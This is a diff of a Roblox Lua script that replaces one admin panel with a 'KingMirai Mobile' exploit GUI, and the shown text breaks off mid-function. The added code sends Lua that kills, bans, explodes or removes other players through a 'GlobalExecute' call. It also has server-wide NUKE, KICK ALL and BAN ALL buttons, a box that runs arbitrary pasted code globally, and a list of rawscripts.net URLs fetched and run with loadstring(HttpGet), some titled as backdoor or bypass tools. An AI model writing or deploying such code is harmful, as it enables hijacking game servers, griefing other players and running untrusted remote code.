- warn("Remote events not found")
- return
-end
-
-remoteNotify.OnClientEvent:Connect(function(title, text, duration)
- StarterGui:SetCore("SendNotification", {
-  Title = title,
-  Text = text,
-  Duration = duration or 3
- })
-end)
-
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "NovaAdmin"
-screenGui.Parent = player:WaitForChild("PlayerGui")
-screenGui.Enabled = false
-
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0,450,0,550)
-mainFrame.Position = UDim2.new(0.5,-225,0.5,-275)
-mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,30)
-mainFrame.BackgroundTransparency = 0.15
-mainFrame.BorderSizePixel = 0
-mainFrame.ClipsDescendants = true
-mainFrame.Parent = screenGui
-
-local blur = Instance.new("BlurEffect")
-blur.Size = 10
-blur.Parent = mainFrame
-
-local titleBar = Instance.new("Frame")
-titleBar.Size = UDim2.new(1,0,0,40)
-titleBar.BackgroundColor3 = Color3.fromRGB(40,30,50)
-titleBar.BackgroundTransparency = 0.3
-titleBar.BorderSizePixel = 0
-titleBar.Parent = mainFrame
-
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Size = UDim2.new(1,0,1,0)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Text = "✦ NOVA ULTIMATE v2.0"
-titleLabel.TextColor3 = Color3.fromRGB(180,130,255)
-titleLabel.TextScaled = true
-titleLabel.Font = Enum.Font.GothamBold
-titleLabel.Parent = titleBar
-
-local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.new(0,30,0,30)
-closeBtn.Position = UDim2.new(1,-35,0,5)
-closeBtn.BackgroundTransparency = 1
-closeBtn.Text = "✕"
-closeBtn.TextColor3 = Color3.fromRGB(255,100,100)
-closeBtn.TextScaled = true
-closeBtn.Font = Enum.Font.GothamBold
-closeBtn.Parent = titleBar
-closeBtn.MouseButton1Click:Connect(function() screenGui.Enabled = false end)
-
-local tabContainer = Instance.new("Frame")
-tabContainer.Size = UDim2.new(1,0,0,40)
-tabContainer.Position = UDim2.new(0,0,0,40)
-tabContainer.BackgroundTransparency = 1
-tabContainer.Parent = mainFrame
-
-local tabs = {"Игроки","Инструменты","Команды","Сервер"}
-local tabButtons = {}
-local currentTab = "Игроки"
-
-local contentContainer = Instance.new("Frame")
-contentContainer.Size = UDim2.new(1,-20,1,-100)
-contentContainer.Position = UDim2.new(0,10,0,85)
-contentContainer.BackgroundTransparency = 1
-contentContainer.Parent = mainFrame
-
-for i, name in ipairs(tabs) do
- local btn = Instance.new("TextButton")
- btn.Size = UDim2.new(0,100,1,0)
- btn.Position = UDim2.new(0,(i-1)*105,0,0)
- btn.BackgroundTransparency = 1
- btn.Text = name
- btn.TextColor3 = Color3.fromRGB(150,150,180)
- btn.TextScaled = true
- btn.Font = Enum.Font.GothamMedium
- btn.Parent = tabContainer
- tabButtons[name] = btn
- btn.MouseButton1Click:Connect(function()
-  currentTab = name
-  updateContent(name)
-  for _,b in pairs(tabButtons) do b.TextColor3 = Color3.fromRGB(150,150,180) end
-  btn.TextColor3 = Color3.fromRGB(180,130,255)
- end)
-end
-
-function updateContent(tab)
- for _,c in ipairs(contentContainer:GetChildren()) do c:Destroy() end
- if tab == "Игроки" then
-  local scroll = Instance.new("ScrollingFrame")
-  scroll.Size = UDim2.new(1,0,1,0)
-  scroll.BackgroundTransparency = 1
-  scroll.CanvasSize = UDim2.new(0,0,0,0)
-  scroll.ScrollBarThickness = 4
-  scroll.Parent = contentContainer
-  local y = 0
-  for _,plr in ipairs(Players:GetPlayers()) do
-   local card = Instance.new("Frame")
-   card.Size = UDim2.new(1,0,0,40)
-   card.Position = UDim2.new(0,0,0,y)
-   card.BackgroundColor3 = Color3.fromRGB(30,30,45)
-   card.BackgroundTransparency = 0.3
-   card.BorderSizePixel = 0
-   card.Parent = scroll
-   local nameL = Instance.new("TextLabel")
-   nameL.Size = UDim2.new(0,150,1,0)
-   nameL.BackgroundTransparency = 1
-   nameL.Text = plr.Name
-   nameL.TextColor3 = Color3.fromRGB(200,200,220)
-   nameL.TextXAlignment = Enum.TextXAlignment.Left
-   nameL.Font = Enum.Font.GothamMedium
-   nameL.TextScaled = true
-   nameL.Parent = card
-   local bx = 160
-   for _,action in ipairs({"TP","Bring","Kill","Heal"}) do
-    local b = Instance.new("TextButton")
-    b.Size = UDim2.new(0,50,0,30)
-    b.Position = UDim2.new(0,bx,0.5,-15)
-    b.BackgroundColor3 = Color3.fromRGB(60,50,80)
-    b.BackgroundTransparency = 0.3
-    b.Text = action
-    b.TextColor3 = Color3.fromRGB(200,200,220)
-    b.TextScaled = true
-    b.Font = Enum.Font.GothamBold
-    b.BorderSizePixel = 0
-    b.Parent = card
-    b.MouseButton1Click:Connect(function()
-     remoteCmd:FireServer(string.lower(action), plr.Name)
+local function CreateNavButton(text, x, y, target)
+    local btn = Instance.new("TextButton", Main)
+    btn.Size = UDim2.new(0.3, -5, 0.08, 0)
+    btn.Position = UDim2.new(x, 5, y, 5)
+    btn.BackgroundColor3 = Color3.fromRGB(0, 200, 80)
+    btn.Text = text
+    btn.TextColor3 = Color3.new(0, 0, 0)
+    btn.Font = Enum.Font.Code
+    btn.TextSize = 16
+    Instance.new("UICorner").Parent = btn
+    btn.MouseButton1Click:Connect(function()
+        local tabs = {
+            PlayersTab, WorldTab, ExecTab, BroadcastTab, GuisTab,
+            SettingsTab, LogTab, FunTab, ToolsTab, AdminTab,
+            AntiTab, FlyTab, NoclipTab, GodmodeTab, SpeedTab
+        }
+        for _, t in ipairs(tabs) do
+            t.Visible = false
+        end
+        Main.Visible = false
+        target.Visible = true
+        AddLog("Переход в " .. text)
     end)
-    bx = bx + 55
-   end
-   y = y + 45
-  end
-  scroll.CanvasSize = UDim2.new(0,0,0,y)
- elseif tab == "Инструменты" then
-  local tools = {{"Fly","Полёт"},{"NoClip","Сквозь стены"},{"Invisible","Невидимость"},{"God","Режим бога"},{"Walkspeed","Скорость"},{"Jumppower","Прыжок"}}
-  local y = 0
-  for _,t in ipairs(tools) do
-   local row = Instance.new("Frame")
-   row.Size = UDim2.new(1,0,0,40)
-   row.Position = UDim2.new(0,0,0,y)
-   row.BackgroundTransparency = 1
-   row.Parent = contentContainer
-   local label = Instance.new("TextLabel")
-   label.Size = UDim2.new(0,150,1,0)
-   label.BackgroundTransparency = 1
-   label.Text = t[2]
-   label.TextColor3 = Color3.fromRGB(200,200,220)
-   label.TextXAlignment = Enum.TextXAlignment.Left
-   label.Font = Enum.Font.GothamMedium
-   label.TextScaled = true
-   label.Parent = row
-   local toggle = Instance.new("TextButton")
-   toggle.Size = UDim2.new(0,80,0,30)
-   toggle.Position = UDim2.new(1,-90,0.5,-15)
-   toggle.BackgroundColor3 = Color3.fromRGB(40,40,60)
-   toggle.Text = "Вкл"
-   toggle.TextColor3 = Color3.fromRGB(150,150,180)
-   toggle.TextScaled = true
-   toggle.Font = Enum.Font.GothamBold
-   toggle.BorderSizePixel = 0
-   toggle.Parent = row
-   local active = false
-   toggle.MouseButton1Click:Connect(function()
-    active = not active
-    toggle.Text = active and "Выкл" or "Вкл"
-    toggle.BackgroundColor3 = active and Color3.fromRGB(80,50,100) or Color3.fromRGB(40,40,60)
-    remoteCmd:FireServer(string.lower(t[1]), player.Name)
-   end)
-   y = y + 45
-  end
- elseif tab == "Команды" then
-  local cmds = {{"kick","Кикнуть"},{"ban","Забанить"},{"tp","Телепорт"},{"bring","Призвать"},{"heal","Вылечить"},{"kill","Убить"},{"respawnall","Респавн всех"},{"freezeall","Заморозить всех"},{"unfreezeall","Разморозить"},{"spam","Спам предметов"},{"shutdown","Закрыть сервер"}}
-  local scroll = Instance.new("ScrollingFrame")
-  scroll.Size = UDim2.new(1,0,1,0)
-  scroll.BackgroundTransparency = 1
-  scroll.CanvasSize = UDim2.new(0,0,0,0)
-  scroll.ScrollBarThickness = 4
-  scroll.Parent = contentContainer
-  local y = 0
-  for _,c in ipairs(cmds) do
-   local row = Instance.new("Frame")
-   row.Size = UDim2.new(1,0,0,35)
-   row.Position = UDim2.new(0,0,0,y)
-   row.BackgroundTransparency = 1
-   row.Parent = scroll
-   local lbl = Instance.new("TextLabel")
-   lbl.Size = UDim2.new(0,120,1,0)
-   lbl.BackgroundTransparency = 1
-   lbl.Text = "/"..c[1]
-   lbl.TextColor3 = Color3.fromRGB(180,130,255)
-   lbl.TextXAlignment = Enum.TextXAlignment.Left
-   lbl.Font = Enum.Font.GothamMedium
-   lbl.TextScaled = true
-   lbl.Parent = row
-   local desc = Instance.new("TextLabel")
-   desc.Size = UDim2.new(1,-130,1,0)
-   desc.Position = UDim2.new(0,130,0,0)
-   desc.BackgroundTransparency = 1
-   desc.Text = c[2]
-   desc.TextColor3 = Color3.fromRGB(150,150,180)
-   desc.TextXAlignment = Enum.TextXAlignment.Left
-   desc.Font = Enum.Font.GothamMedium
-   desc.TextScaled = true
-   desc.Parent = row
-   y = y + 40
-  end
-  scroll.CanvasSize = UDim2.new(0,0,0,y)
- elseif tab == "Сервер" then
-  local y = 0
-  local actions = {{"Респавн всех","respawnall"},{"Заморозить всех","freezeall"},{"Разморозить всех","unfreezeall"},{"Закрыть сервер","shutdown"}}
-  for _,a in ipairs(actions) do
-   local btn = Instance.new("TextButton")
-   btn.Size = UDim2.new(1,-20,0,45)
-   btn.Position = UDim2.new(0,10,0,y)
-   btn.BackgroundColor3 = Color3.fromRGB(40,30,60)
-   btn.BackgroundTransparency = 0.3
-   btn.Text = a[1]
-   btn.TextColor3 = Color3.fromRGB(200,200,220)
-   btn.TextScaled = true
-   btn.Font = Enum.Font.GothamBold
-   btn.BorderSizePixel = 0
-   btn.Parent = contentContainer
-   btn.MouseButton1Click:Connect(function() remoteCmd:FireServer(a[2]) end)
-   y = y + 55
-  end
-  local stats = Instance.new("TextLabel")
-  stats.Size = UDim2.new(1,-20,0,60)
-  stats.Position = UDim2.new(0,10,0,y+10)
-  stats.BackgroundTransparency = 1
-  stats.Text = "Игроков онлайн: "..#Players:GetPlayers().."\nВерсия: Nova Ultimate v2.0"
-  stats.TextColor3 = Color3.fromRGB(150,150,180)
-  stats.TextScaled = true
-  stats.Font = Enum.Font.GothamMedium
-  stats.Parent = contentContainer
- end
+    return btn
 end
 
-UserInputService.InputBegan:Connect(function(input, gp)
- if gp then return end
- if input.KeyCode == Enum.KeyCode.M then
-  screenGui.Enabled = not screenGui.Enabled
-  if screenGui.Enabled then
-   updateContent(currentTab)
-   mainFrame.Position = UDim2.new(0.5,-225,0.5,-300)
-   mainFrame.BackgroundTransparency = 1
-   local tween = TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Back), {Position = UDim2.new(0.5,-225,0.5,-275), BackgroundTransparency = 0.15})
-   tween:Play()
-  end
- end
+-- Первый ряд (5 кнопок)
+CreateNavButton("PLAYERS", 0.02, 0.12, PlayersTab)
+CreateNavButton("WORLD", 0.35, 0.12, WorldTab)
+CreateNavButton("EXEC", 0.68, 0.12, ExecTab)
+CreateNavButton("BROADCAST", 0.02, 0.24, BroadcastTab)
+CreateNavButton("GUIS", 0.35, 0.24, GuisTab)
+
+-- Второй ряд (5 кнопок)
+CreateNavButton("SETTINGS", 0.68, 0.24, SettingsTab)
+CreateNavButton("LOGS", 0.02, 0.36, LogTab)
+CreateNavButton("FUN", 0.35, 0.36, FunTab)
+CreateNavButton("TOOLS", 0.68, 0.36, ToolsTab)
+CreateNavButton("ADMIN", 0.02, 0.48, AdminTab)
+
+-- Третий ряд (5 кнопок)
+CreateNavButton("ANTI", 0.35, 0.48, AntiTab)
+CreateNavButton("FLY", 0.68, 0.48, FlyTab)
+CreateNavButton("NOCLIP", 0.02, 0.60, NoclipTab)
+CreateNavButton("GODMODE", 0.35, 0.60, GodmodeTab)
+CreateNavButton("SPEED", 0.68, 0.60, SpeedTab)
+
+-- Кнопка закрытия GUI (крупная)
+local CloseGUI = Instance.new("TextButton", Main)
+CloseGUI.Size = UDim2.new(0.9, 0, 0.08, 0)
+CloseGUI.Position = UDim2.new(0.05, 5, 0.75, 5)
+CloseGUI.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+CloseGUI.Text = "CLOSE GUI"
+CloseGUI.TextColor3 = Color3.new(1, 1, 1)
+CloseGUI.Font = Enum.Font.Code
+CloseGUI.TextSize = 18
+Instance.new("UICorner").Parent = CloseGUI
+CloseGUI.MouseButton1Click:Connect(function()
+    Main.Visible = false
+    OpenBtn.Visible = true
+    AddLog("GUI свёрнут")
 end)
 
-print("Nova Ultimate Client loaded")
+-- ================================================================
+-- ВКЛАДКИ (уменьшенные, но с прокруткой)
+-- ================================================================
 
+local function CreateTabFrame(title)
+    local frame = Instance.new("Frame", ScreenGui)
+    frame.Size = UDim2.new(0.95, 0, 0.85, 0)
+    frame.Position = UDim2.new(0.025, 0, 0.075, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(10, 15, 10)
+    frame.BackgroundTransparency = 0.1
+    frame.Draggable = false
+    frame.Active = false
+    frame.Visible = false
+    frame.ClipsDescendants = true
+    Instance.new("UICorner").Parent = frame
+
+    local t = Instance.new("TextLabel", frame)
+    t.Size = UDim2.new(0.6, 0, 0, 35)
+    t.Position = UDim2.new(0.05, 0, 0, 5)
+    t.BackgroundTransparency = 1
+    t.Text = "KingMirai Mobile // " .. title
+    t.TextColor3 = Color3.fromRGB(255, 215, 0)
+    t.Font = Enum.Font.Code
+    t.TextSize = 16
+    t.TextXAlignment = Enum.TextXAlignment.Left
+
+    local c = Instance.new("TextButton", frame)
+    c.Size = UDim2.new(0, 50, 0, 40)
+    c.Position = UDim2.new(1, -60, 0, 5)
+    c.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    c.Text = "X"
+    c.TextColor3 = Color3.new(1, 1, 1)
+    c.Font = Enum.Font.Code
+    c.TextSize = 18
+    Instance.new("UICorner").Parent = c
+    c.MouseButton1Click:Connect(function()
+        frame.Visible = false
+        Main.Visible = true
+    end)
+
+    return frame
 end
+
+local PlayersTab = CreateTabFrame("PLAYERS")
+local WorldTab = CreateTabFrame("WORLD")
+local ExecTab = CreateTabFrame("EXEC")
+local BroadcastTab = CreateTabFrame("BROADCAST")
+local GuisTab = CreateTabFrame("GUIS")
+local SettingsTab = CreateTabFrame("SETTINGS")
+local LogTab = CreateTabFrame("LOGS")
+local FunTab = CreateTabFrame("FUN")
+local ToolsTab = CreateTabFrame("TOOLS")
+local AdminTab = CreateTabFrame("ADMIN")
+local AntiTab = CreateTabFrame("ANTI")
+local FlyTab = CreateTabFrame("FLY")
+local NoclipTab = CreateTabFrame("NOCLIP")
+local GodmodeTab = CreateTabFrame("GODMODE")
+local SpeedTab = CreateTabFrame("SPEED")
+
+-- ================================================================
+-- PLAYERS TAB (список игроков с прокруткой)
+-- ================================================================
+
+local PlayerList = Instance.new("ScrollingFrame", PlayersTab)
+PlayerList.Size = UDim2.new(1, -20, 0.75, 0)
+PlayerList.Position = UDim2.new(0, 10, 0, 50)
+PlayerList.BackgroundColor3 = Color3.fromRGB(20, 25, 20)
+PlayerList.BackgroundTransparency = 0.5
+PlayerList.CanvasSize = UDim2.new(0, 0, 0, 0)
+PlayerList.ScrollBarThickness = 6
+Instance.new("UICorner").Parent = PlayerList
+
+local function UpdatePlayerList()
+    for _, c in pairs(PlayerList:GetChildren()) do
+        if c:IsA("TextButton") then c:Destroy() end
+    end
+    local y = 0
+    for _, p in pairs(Players:GetPlayers()) do
+        local btn = Instance.new("TextButton", PlayerList)
+        btn.Size = UDim2.new(1, -10, 0, 45)
+        btn.Position = UDim2.new(0, 5, 0, y)
+        if p == Player then
+            btn.BackgroundColor3 = Color3.fromRGB(0, 60, 0)
+        else
+            btn.BackgroundColor3 = Color3.fromRGB(25, 35, 25)
+        end
+        btn.Text = p.Name .. (p == Player and " (YOU)" or "")
+        btn.TextColor3 = Color3.fromRGB(0, 255, 100)
+        btn.Font = Enum.Font.Code
+        btn.TextSize = 14
+        Instance.new("UICorner").Parent = btn
+
+        btn.MouseButton1Click:Connect(function()
+            AddLog("Выбран игрок: " .. p.Name)
+            local actions = {
+                "Kill", "Teleport", "Bring", "God", "Speed",
+                "Freeze", "Ban", "Explode", "Clone", "Remove",
+                "Fly", "NoClip", "Invisible", "Fire", "Smoke"
+            }
+            local actionFrame = Instance.new("Frame", PlayersTab)
+            actionFrame.Size = UDim2.new(1, -20, 0.2, 0)
+            actionFrame.Position = UDim2.new(0, 10, 0.78, 5)
+            actionFrame.BackgroundColor3 = Color3.fromRGB(10, 15, 10)
+            actionFrame.BackgroundTransparency = 0.3
+            Instance.new("UICorner").Parent = actionFrame
+
+            local ay = 0
+            for _, act in ipairs(actions) do
+                local abtn = Instance.new("TextButton", actionFrame)
+                abtn.Size = UDim2.new(0.18, -5, 0.4, -5)
+                abtn.Position = UDim2.new((ay % 5) * 0.2, 5, math.floor(ay / 5) * 0.45, 5)
+                abtn.BackgroundColor3 = Color3.fromRGB(50, 100, 255)
+                abtn.Text = act
+                abtn.TextColor3 = Color3.new(1, 1, 1)
+                abtn.Font = Enum.Font.Code
+                abtn.TextSize = 12
+                Instance.new("UICorner").Parent = abtn
+                abtn.MouseButton1Click:Connect(function()
+                    AddLog("Действие " .. act .. " над " .. p.Name)
+                    local code = string.format([[
+                        local target = game.Players:FindFirstChild("%s")
+                        if target and target.Character then
+                            local hum = target.Character:FindFirstChild("Humanoid")
+                            local root = target.Character:FindFirstChild("HumanoidRootPart")
+                            if "%s" == "Kill" and hum then hum.Health = 0
+                            elseif "%s" == "Teleport" and root then root.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                            elseif "%s" == "Bring" and root then root.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+                            elseif "%s" == "God" and hum then hum.MaxHealth = math.huge hum.Health = math.huge
+                            elseif "%s" == "Speed" and hum then hum.WalkSpeed = 100
+                            elseif "%s" == "Freeze" and hum then hum.WalkSpeed = 0
+                            elseif "%s" == "Ban" then target:Kick("Banned by KingMirai")
+                            elseif "%s" == "Explode" and root then
+                                local exp = Instance.new("Explosion")
+                                exp.Position = root.Position
+                                exp.BlastRadius = 30
+                                exp.BlastPressure = 500000
+                                exp.Parent = workspace
+                            elseif "%s" == "Clone" and root then
+                                local c = target.Character:Clone()
+                                c.Parent = workspace
+                                c:SetPrimaryPartCFrame(root.CFrame + Vector3.new(5,0,0))
+                            elseif "%s" == "Remove" then target.Character:Destroy()
+                            elseif "%s" == "Fly" and hum then hum.PlatformStand = true root.Velocity = Vector3.new(0,50,0)
+                            elseif "%s" == "NoClip" and root then
+                                for _, p in pairs(target.Character:GetDescendants()) do
+                                    if p:IsA("BasePart") then p.CanCollide = false
+                                    end
+                                end
+                            elseif "%s" == "Invisible" then
+                                for _, p in pairs(target.Character:GetDescendants()) do
+                                    if p:IsA("BasePart") then p.Transparency = 1
+                                    end
+                                end
+                            elseif "%s" == "Fire" and root then
+                                local fire = Instance.new("Fire", root)
+                                fire.Size = 10
+                            elseif "%s" == "Smoke" and root then
+                                local smoke = Instance.new("Smoke", root)
+                                smoke.RiseVelocity = 50
+                                smoke.Opacity = 0.5
+                            end
+                        end
+                    ]], p.Name, act, act, act, act, act, act, act, act, act, act, act, act, act, act, act)
+                    GlobalExecute(code)
+                    actionFrame:Destroy()
+                end)
+                ay = ay + 1
+            end
+        end)
+        y = y + 50
+    end
+    PlayerList.CanvasSize = UDim2.new(0, 0, 0, y)
+end
+
+UpdatePlayerList()
+Players.PlayerAdded:Connect(UpdatePlayerList)
+Players.PlayerRemoving:Connect(UpdatePlayerList)
+
+-- ================================================================
+-- WORLD TAB (улучшенный: добавлены новые кнопки)
+-- ================================================================
+
+local function AddWorldButton(text, cmd, x, y, color)
+    local btn = Instance.new("TextButton", WorldTab)
+    btn.Size = UDim2.new(0.3, -5, 0.1, 0)
+    btn.Position = UDim2.new(x, 5, y, 5)
+    btn.BackgroundColor3 = color or Color3.fromRGB(40, 15, 15)
+    btn.Text = text
+    btn.TextColor3 = Color3.new(1, 1, 1)
+    btn.Font = Enum.Font.Code
+    btn.TextSize = 14
+    Instance.new("UICorner").Parent = btn
+    btn.MouseButton1Click:Connect(function()
+        AddLog("Глобальная команда: " .. cmd)
+        GlobalCommand(cmd, "")
+    end)
+end
+
+AddWorldButton("NUKE", "nuke", 0.02, 0.02)
+AddWorldButton("DESTROY", "destroy", 0.35, 0.02)
+AddWorldButton("KICK ALL", "kickall", 0.68, 0.02)
+AddWorldButton("GRAV 0", "gravity0", 0.02, 0.14)
+AddWorldButton("GRAV 1000", "gravity1000", 0.35, 0.14)
+AddWorldButton("DAY", "day", 0.68, 0.14)
+AddWorldButton("NIGHT", "night", 0.02, 0.26)
+AddWorldButton("FIRE", "fire", 0.35, 0.26)
+AddWorldButton("REMOVE PARTS", "removeparts", 0.68, 0.26)
+AddWorldButton("KILL ALL", "killall", 0.02, 0.38)
+AddWorldButton("BAN ALL", "banall", 0.35, 0.38)
+AddWorldButton("TP ALL", "tpall", 0.68, 0.38)
+AddWorldButton("EXPLODE ALL", "explodeall", 0.02, 0.50)
+AddWorldButton("FREEZE ALL", "freezeall", 0.35, 0.50)
+AddWorldButton("UNFREEZE ALL", "unfreezeall", 0.68, 0.50)
+AddWorldButton("GOD ALL", "godall", 0.02, 0.62)
+
+-- ================================================================
+-- EXEC TAB (увеличен)
+-- ================================================================
+
+local CodeBox = Instance.new("TextBox", ExecTab)
+CodeBox.Size = UDim2.new(1, -20, 0.45, 0)
+CodeBox.Position = UDim2.new(0, 10, 0, 50)
+CodeBox.BackgroundColor3 = Color3.fromRGB(20, 25, 20)
+CodeBox.Text = "-- Paste any Lua code here --"
+CodeBox.TextColor3 = Color3.fromRGB(200, 255, 200)
+CodeBox.TextWrapped = true
+CodeBox.MultiLine = true
+CodeBox.ClearTextOnFocus = false
+CodeBox.Font = Enum.Font.Code
+CodeBox.TextSize = 14
+Instance.new("UICorner").Parent = CodeBox
+
+local ExecBtn = Instance.new("TextButton", ExecTab)
+ExecBtn.Size = UDim2.new(0.5, -10, 0.1, 0)
+ExecBtn.Position = UDim2.new(0.25, 5, 0.55, 5)
+ExecBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
+ExecBtn.Text = "EXECUTE (GLOBAL)"
+ExecBtn.TextColor3 = Color3.new(0, 0, 0)
+ExecBtn.Font = Enum.Font.Code
+ExecBtn.TextSize = 18
+Instance.new("UICorner").Parent = ExecBtn
+ExecBtn.MouseButton1Click:Connect(function()
+    AddLog("Выполнение кода на сервере")
+    GlobalExecute(CodeBox.Text)
+end)
+
+-- ================================================================
+-- BROADCAST TAB
+-- ================================================================
+
+local MsgBox = Instance.new("TextBox", BroadcastTab)
+MsgBox.Size = UDim2.new(1, -20, 0.2, 0)
+MsgBox.Position = UDim2.new(0, 10, 0, 50)
+MsgBox.BackgroundColor3 = Color3.fromRGB(20, 25, 20)
+MsgBox.Text = "Type your message here..."
+MsgBox.TextColor3 = Color3.fromRGB(0, 255, 100)
+MsgBox.Font = Enum.Font.Code
+MsgBox.TextSize = 16
+MsgBox.ClearTextOnFocus = false
+Instance.new("UICorner").Parent = MsgBox
+
+local HintBtn = Instance.new("TextButton", BroadcastTab)
+HintBtn.Size = UDim2.new(0.4, -10, 0.1, 0)
+HintBtn.Position = UDim2.new(0.05, 5, 0.35, 5)
+HintBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
+HintBtn.Text = "HINT (POPUP)"
+HintBtn.TextColor3 = Color3.new(0, 0, 0)
+HintBtn.Font = Enum.Font.Code
+HintBtn.TextSize = 16
+Instance.new("UICorner").Parent = HintBtn
+HintBtn.MouseButton1Click:Connect(function()
+    AddLog("Отправка глобального уведомления: " .. MsgBox.Text)
+    GlobalBroadcast(MsgBox.Text)
+end)
+
+local ChatBtn = Instance.new("TextButton", BroadcastTab)
+ChatBtn.Size = UDim2.new(0.4, -10, 0.1, 0)
+ChatBtn.Position = UDim2.new(0.55, 5, 0.35, 5)
+ChatBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 200)
+ChatBtn.Text = "CHAT (GLOBAL)"
+ChatBtn.TextColor3 = Color3.new(1, 1, 1)
+ChatBtn.Font = Enum.Font.Code
+ChatBtn.TextSize = 16
+Instance.new("UICorner").Parent = ChatBtn
+ChatBtn.MouseButton1Click:Connect(function()
+    AddLog("Отправка в чат: " .. MsgBox.Text)
+    GlobalChat(MsgBox.Text)
+end)
+
+-- ================================================================
+-- GUIS TAB
+-- ================================================================
+
+local GScroll = Instance.new("ScrollingFrame", GuisTab)
+GScroll.Size = UDim2.new(1, -20, 1, -60)
+GScroll.Position = UDim2.new(0, 10, 0, 50)
+GScroll.BackgroundTransparency = 1
+GScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+Instance.new("UIListLayout", GScroll).Padding = UDim.new(0, 5)
+
+local function addGuiBtn(name, url)
+    local btn = Instance.new("TextButton", GScroll)
+    btn.Size = UDim2.new(1, -10, 0, 45)
+    btn.BackgroundColor3 = Color3.fromRGB(25, 35, 25)
+    btn.Text = name:upper()
+    btn.TextColor3 = Color3.fromRGB(0, 255, 100)
+    btn.Font = Enum.Font.Code
+    btn.TextSize = 14
+    Instance.new("UICorner").Parent = btn
+    btn.MouseButton1Click:Connect(function()
+        AddLog("Загрузка GUI: " .. name)
+        GlobalExecute('loadstring(game:HttpGet("' .. url .. '"))()')
+    end)
+end
+
+local GuiList = {
+    {"RoXploit f3x", "https://rawscripts.net/raw/Universal-Script-RoXploit-Ported-By-x9d-f3x-122683"},
+    {"k22lgui", "https://rawscripts.net/raw/Universal-Script-K22lgui-237529"},
+    {"pixel gui", "https://rawscripts.net/raw/Universal-Script-pixel-f3x-gui-leaked-240610"},
+    {"krnl1 gui", "https://rawscripts.net/raw/Universal-Script-Loophax-gui-237638"},
+    {"TheHackLord", "https://rawscripts.net/raw/Universal-Script-MOST-OP-GUI-F3X-MOST-OP-GUI-HAS-FE-BYPASS-AND-BACKDOOR-167144"},
+    {"star v1.0", "https://rawscripts.net/raw/Universal-Script-My-script-167061"},
+    {"z000rz gui", "https://rawscripts.net/raw/Universal-Script-z000rzkidd-F3X-GUI-40-buttons-113528"},
+    {"zibran gui", "https://rawscripts.net/raw/Universal-Script-zibranF3X-Gui-148771"},
+    {"syphonx", "https://rawscripts.net/raw/Universal-Script-SyphonX-f3x-abuse-gui-156472"},
+    {"c00lgui", "https://rawscripts.net/raw/Universal-Script-C00LGUI-F3X-PORT-MADE-BY-LOOPSKIDD-LEAKED-BY-PELUSIN-166496"},
+    {"trafficconeHax", "https://rawscripts.net/raw/Universal-Script-TrafficConeHax-f3x-gui-reupload-135819"},
+    {"d00mgui", "https://rawscripts.net/raw/Universal-Script-D00MKIDD-F3x-GUI-IS-BACK-143642"},
+    {"mango gui", "https://rawscripts.net/raw/Universal-Script-Mangotrollfaceedit-F3X-gui-60940"},
+    {"k00pgui v8", "https://rawscripts.net/raw/Universal-Script-k00pgui-v8-F3X-EDITON-52670"},
+    {"bl1ss ultimate", "https://rawscripts.net/raw/Universal-Script-Reposted-Bliss-ultimate-f3x-gui-v5-87781"},
+    {"rovan gui v3", "https://rawscripts.net/raw/Universal-Script-R0van-Gui-F3x-v3-110647"},
+    {"redkidd gui", "https://rawscripts.net/raw/Universal-Script-REDKIDD-GUI-F3X-115010"},
+    {"warmkidd gui", "https://rawscripts.net/raw/Universal-Script-warmkidd-gui-f3x-port-147385"},
+    {"loopkidd gui", "https://rawscripts.net/raw/Universal-Script-loopkidd-gui-v4-f3x-122839"},
+    {"Teamkevin gui", "https://rawscripts.net/raw/Universal-Script-TEAMKEVINX5HEB-F3X-GUI-V1-135072"},
+}
+for _, item in ipairs(GuiList) do
+    addGuiBtn(item[1], item[2])
+end
+
+-- ================================================================
+-- LOGS TAB (увеличен)
+-- ================================================================
+
+local LogFrame = Instance.new("ScrollingFrame", LogTab)
+LogFrame.Size = UDim2.new(1, -20, 1, -60)
+LogFrame.Position = UDim2.new(0, 10, 0, 50)
+LogFrame.BackgroundColor3 = Color3.fromRGB(10, 15, 10)
+LogFrame.BackgroundTransparency = 0.3
+LogFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+LogFrame.ScrollBarThickness = 6
+Instance.new("UICorner").Parent = LogFrame
+
+LogLabel = Instance.new("TextLabel", LogFrame)
+LogLabel.Size = UDim2.new(1, 0, 0, 0)
+LogLabel.Position = UDim2.new(0, 0, 0, 0)
+LogLabel.BackgroundTransparency = 1
+LogLabel.Text = ""
+LogLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
+LogLabel.TextScaled = false
+LogLabel.TextSize = 14
+LogLabel.TextWrapped = true
+LogLabel.Font = Enum.Font.Code
+
+local function UpdateLogSize()
+    if LogLabel then
+        LogLabel.Size = UDim2.new(1, 0, 0, LogLabel.TextBounds.Y + 10)
+        LogFrame.CanvasSize = UDim2.new(0, 0, 0, LogLabel.TextBounds.Y + 10)
+        LogFrame.CanvasPosition = Vector2.new(0, LogFrame.AbsoluteCanvasSize.Y)
+    end
+end
+
+local oldAddLog = AddLog
+AddLog = function(text)
+    oldAddLog(text)
+    task.wait()
+    UpdateLogSize()
+end
+
+-- ================================================================
+-- FUN TAB (новые приколы)
+-- ================================================================
+
+local function AddFunButton(text, cmd, x, y)
+    local btn = Instance.new("TextButton", FunTab)
+    btn.Size = UDim2.new(0.3, -5, 0.1, 0)
+    btn.Position = UDim2.new(x, 5, y, 5)
+    btn.BackgroundColor3 = Color3.fromRGB(150, 50, 255)
+    btn.Text = text
+    btn.TextColor3 = Color3.new(1, 1, 1)
+    btn.Font = Enum.Font.Code
+    btn.TextSize = 14
+    Instance.new("UICorner").Parent = btn
